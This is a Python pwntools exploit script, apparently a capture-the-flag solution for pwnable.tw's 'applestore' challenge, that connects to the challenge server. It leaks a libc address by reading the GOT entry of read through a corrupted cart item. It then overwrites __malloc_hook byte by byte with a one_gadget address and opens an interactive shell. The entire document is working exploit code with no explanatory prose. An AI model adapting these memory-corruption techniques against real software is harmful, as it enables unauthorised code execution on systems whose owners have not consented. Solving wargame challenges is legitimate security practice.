from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)


elf = context.binary = ELF('applestore')
libc = ELF('libc.so.6')

def add(id):
    sla(B'> ', b'2')
    sla(b'Number> ', str(id).encode())
def delete(id):
    sla(b'> ', b'3')
    sla(b'Number> ', str(id).encode())
def cart():
    sla(b'> ', b'4')
    sla(b'(y/n) > ', b'y')
def checkout():
    sla(b'> ', b'5')
    sla(b'(y/n) > ', b'y')


#nc chall.pwnable.tw 10104

p = remote('chall.pwnable.tw', 10104)
#p = process()
#db.attach(p, gdbscript='''
#           b *0x8048a5c
#           b *0x8048cf6
#c''')

for i in range(20):
    add(2)
for i in range(6):
    add(1)
checkout()                  # get iphone8
for i in range(26):
    delete(1)

#LEAK LIBC
sla(b'> ', b'4')
sla(b'(y/n) > ', b'yy' + p32(elf.got['read']) + p32(0)*3)
p.recvuntil(b'1: ')
leak = p.recv(4)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - libc.symbols['read']
print('libc: ', hex(libc.address))


BSS = 0x804b100
ONE_GADGET = 0x3a819 + libc.address
for i in range(4):
    sla(b'> ', b'3')
    sla(b'Number> ', b'1\x00' + p32(BSS) + p32(0) + p32(libc.symbols['__malloc_hook'] + i - 0xc) + p32(BSS + ((ONE_GADGET >> i*8) & 0xff)))
add(1)

p.interactive()